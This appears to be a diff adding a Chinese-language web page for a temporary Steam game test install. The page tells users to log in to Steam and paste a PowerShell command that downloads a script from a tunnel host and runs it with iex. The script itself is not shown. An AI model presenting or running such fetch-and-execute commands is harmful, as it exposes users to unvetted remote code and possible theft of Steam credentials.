@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Expriverse · 临时测试安装</title>
+<style>
+:root{color-scheme:light;color:#172a39;background:#f0f4f7;font-family:"Segoe UI","Microsoft YaHei",sans-serif}*{box-sizing:border-box}body{margin:0}main{max-width:880px;padding:40px 22px 64px;margin:auto}a{color:#145db5}h1{font-size:2rem;line-height:1.4}h2{font-size:1.2rem}p,li{font-size:1rem;line-height:1.8}.panel{background:#fff;border:1px solid #d6e0e7;border-radius:12px;padding:24px;margin:22px 0}.meta{color:#556677}.command{display:block;width:100%;min-height:100px;resize:vertical;background:#112e40;color:#fff;border:0;border-radius:8px;padding:16px;font:14px/1.7 Consolas,monospace;overflow-wrap:anywhere}button,.button{display:inline-block;padding:10px 16px;border-radius:6px;background:#145db5;color:white;border:0;font:inherit;text-decoration:none;cursor:pointer;margin:12px 10px 0 0}button:focus-visible,a:focus-visible,textarea:focus-visible{outline:3px solid #087b68;outline-offset:3px}.notice{border-left:4px solid #d18a11;background:#fff7e5;padding:14px 18px}code{overflow-wrap:anywhere}#feedback{min-height:1.5em;color:#087b68}nav{display:flex;gap:20px;flex-wrap:wrap}@media(max-width:480px){main{padding:24px 16px}.panel{padding:18px}}
+</style>
+</head>
+<body><main>
+<nav><a href="../">网页导航</a></nav>
+<h1>临时测试安装</h1>
+<p class="meta">Expriverse · 2026-10-02 fix3 · Windows x64</p>
+<section class="panel">
+<h2>安装、运行，测试后清理</h2>
+<ol><li>先打开 Steam，登录自己的账号。</li><li>在 Windows PowerShell 或 PowerShell 中粘贴下面的命令。</li><li>输入 <strong>Yes</strong>：下载到桌面上的独立测试目录，校验后解压并运行。输入 <strong>No</strong> 则取消，不创建安装文件。</li><li>保持终端窗口打开，完成游戏测试。</li><li>需要反馈的日志先另行保存。测试结束后回到终端，输入 <strong>Delete</strong>：结束本次启动的游戏进程树，并删除安装目录、日志和下载文件。</li></ol>
+<textarea class="command" id="install-command" readonly aria-label="临时测试安装命令" spellcheck="false">irm https://www.h6968de49.nyat.app:13628/downloads/test-session.txt | iex</textarea>
+<button id="copy-command" type="button">复制安装命令</button> <a href="./test-session.txt" target="_blank" rel="noopener">查看脚本</a>
+<p id="feedback" role="status" aria-live="polite"></p>
+<p class="notice">请用 <strong>Delete</strong> 完成清理，不要直接关闭终端或关机。强制关闭时无法保证文件清理完成。脚本只管理自己的测试目录和进程，不删除 Windows、Steam 自身产生的缓存或记录。</p>
+</section>
+<section class="panel"><h2>也可以手动下载</h2>
+<p>压缩包约 102.7 MiB，解压后约 301.4 MiB。下载期间，网站及隧道需要保持在线。</p>
+<a class="button" href="./SteamValidation-20261002-fix3.zip" download>下载 fix3 测试包</a>
+<p>手动下载不会自动安装或清理。解压后运行根目录的 <code>Start-NetworkValidation.cmd</code>。</p>
+<details><summary>SHA-256 校验值</summary><p><code>9ACFC3DB4A4A707FBBFC2D9C5636E3E8A561F278330DD5548CB5A8344DB42060</code></p></details>
+</section>
+</main><script>
+document.getElementById('copy-command').addEventListener('click', async () => {
+  const command = document.getElementById('install-command');
+  try { await navigator.clipboard.writeText(command.value); document.getElementById('feedback').textContent = '已复制，请在 PowerShell 中粘贴执行。'; }
+  catch { command.focus(); command.select(); document.getElementById('feedback').textContent = '请按 Ctrl+C 复制已选中的命令。'; }
+});
+</script></body></html>
